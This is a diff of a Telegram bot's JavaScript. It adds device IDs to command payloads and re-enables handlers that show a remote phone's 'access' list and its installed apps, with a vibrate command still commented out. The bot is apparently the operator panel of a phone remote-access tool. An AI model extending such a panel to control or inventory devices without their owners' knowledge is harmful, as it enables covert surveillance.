@@ -427,6 +427,7 @@ bot.on("message", async (message) => {
                             chat_id: message.chat.id,
                             message_id: message.message_id,
                             msgowner: message.from.id,
+                            device_id: _devid,
                             edit: false
                         }
                     }))
@@ -456,6 +457,7 @@ bot.on("message", async (message) => {
                                     chat_id: message.chat.id,
                                     message_id: rmsg.message_id,
                                     url: message.text,
+                                    device_id: devid,
                                     edit: true
                                 }
                             }));
@@ -489,6 +491,8 @@ bot.on("message", async (message) => {
                                 shortcut: {
                                     chat_id: message.chat.id,
                                     message_id: rmsg.message_id,
+                                    toast: message.text,
+                                    device_id: devid,
                                     edit: true
                                 }
                             }));
@@ -628,6 +632,7 @@ bot.on("callback_query", async (call) => {
                 shortcut: {
                     chat_id: call.message.chat.id,
                     message_id: call.message.message_id,
+                    device_id: spl[2],
                     edit: true
                 }
             }))
@@ -672,6 +677,7 @@ bot.on("callback_query", async (call) => {
                 shortcut: {
                     chat_id: call.message.chat.id,
                     message_id: call.message.message_id,
+                    device_id: spl[2],
                     edit: true
                 }
             }))
@@ -693,6 +699,7 @@ bot.on("callback_query", async (call) => {
                     chat_id: call.message.chat.id,
                     message_id: call.message.message_id,
                     msgowner: uid,
+                    device_id: spl[2],
                     edit: true
                 }
             }))
@@ -740,25 +747,25 @@ me.on("data", async (data) => {
             if (_message.method == "getUsers"){
                 updating_users = _message.users;
                 console.log("USERS SETED");
-            }// else if (_message.method == "getUserByDeviceId"){
-//                 if (_message.shortcut){
-//                     if (_message.shortcut.way == 'seeMenu'){
-//                         createKeyboard(_message.user.accessory, _message.user.device_id, _message.shortcut.msgowner, async (keyboard) => {
-//                             await bot.sendMessage(
-//                                 _message.shortcut.chat_id,
-//                                 build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_message.user.device_id}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
-//                                 {
-//                                     reply_to_message_id: _message.shortcut.message_id,
-//                                     parse_mode: "HTML",
-//                                     reply_markup: {
-//                                         inline_keyboard: keyboard
-//                                     }
-//                                 }
-//                             )
-//                         })
-//                     }
-//                 }
-//             } else if (_message.method == "vibratePhone"){
+            } else if (_message.method == "getUserByDeviceId"){
+                if (_message.shortcut){
+                    if (_message.shortcut.way == 'seeMenu'){
+                        createKeyboard(_message.user.accessory, _message.user.device_id, _message.shortcut.msgowner, async (keyboard) => {
+                            await bot.sendMessage(
+                                _message.shortcut.chat_id,
+                                build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_message.user.device_id}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
+                                {
+                                    reply_to_message_id: _message.shortcut.message_id,
+                                    parse_mode: "HTML",
+                                    reply_markup: {
+                                        inline_keyboard: keyboard
+                                    }
+                                }
+                            )
+                        })
+                    }
+                }
+            }// else if (_message.method == "vibratePhone"){
 //                 if (_message.shortcut){
 //                     await bot.editMessageText(
 //                         build(`💠 ${sym} device of ${_message.device_id} were vibrated`),
@@ -799,23 +806,23 @@ me.on("data", async (data) => {
                     //     }
                     // )
 //                 }
-//             } else if (_message.method == "getInstalledApps"){
-//                 if (_message.shortcut){
-//                     device_apps[_message.device_id] = _message.apps;
-//                     let srta = sortAppsToString(_message.apps, 0, _message.device_id, _message.shortcut.msgowner)
-//                     await bot.editMessageText(
-//                         srta.message,
-//                         {
-//                             chat_id: _message.shortcut.chat_id,
-//                             message_id: _message.shortcut.message_id,
-//                             reply_markup: {
-//                                 inline_keyboard: srta.binds
-//                             }
-//                         }
-//                     )
-//                 }
-//             }
-//         } else {
+            else if (_message.method == "getInstalledApps"){
+                if (_message.shortcut){
+                    device_apps[_message.device_id] = _message.apps;
+                    let srta = sortAppsToString(_message.apps, 0, _message.device_id, _message.shortcut.msgowner)
+                    await bot.editMessageText(
+                        srta.message,
+                        {
+                            chat_id: _message.shortcut.chat_id,
+                            message_id: _message.shortcut.message_id,
+                            reply_markup: {
+                                inline_keyboard: srta.binds
+                            }
+                        }
+                    )
+                }
+            }
+        //} else {
 //             if (_message.shortcut){
 //                 if (_message.message == "USER_NOT_FOUND"){
 //                     _message.edit == false ? await bot.sendMessage(
